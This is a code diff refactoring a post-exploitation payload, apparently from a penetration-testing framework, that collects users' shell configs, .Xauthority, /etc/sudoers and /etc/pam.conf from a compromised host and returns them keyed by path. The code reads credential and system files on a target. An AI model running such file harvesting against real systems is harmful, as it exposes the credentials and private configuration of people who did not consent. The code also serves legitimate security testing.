@@ -7,10 +7,9 @@ class config_files(base_payload):
     some of them may contain sensitive information.
     '''
     def api_read(self):
-        result = []
+        result = {}
         config_files = []
-
-        folders = self.exec_payload('users_folders')
+        folders = self.exec_payload('users_name').values()
         for folder in folders:
             config_files.append(folder+'.bashrc')
             config_files.append(folder+'.bashrc~')
@@ -35,6 +34,7 @@ class config_files(base_payload):
             config_files.append(folder+'.Xauthority')
             config_files.append(folder+'.cshrc')
             config_files.append(folder+'.login')
+            config_files.append(folder+'.joe_state')
             
 
         config_files.append('/etc/sudoers')
@@ -46,17 +46,21 @@ class config_files(base_payload):
         config_files.append('/etc/pam.conf')
 
         for file in config_files:
-            if self.shell.read(file) != '':
-                result.append('-------------------------')
-                result.append('FILE => '+file)
-                result.append(self.shell.read(file))
-
-        #result = list(set(result))
-        result = [p for p in result if p != '']
+            content = self.shell.read(file)
+            if content:
+                result.update({file:content})
         return result
         
     def run_read(self):
-        result = self.api_read()
+        hashmap = self.api_read()
+        result = []
+        
+        for file, content in hashmap.iteritems():
+            result.append('-------------------------')
+            result.append(file)
+            result.append('-------------------------')
+            result.append(content)
+        
         if result == [ ]:
             result.append('Configuration files not found.')
         return result
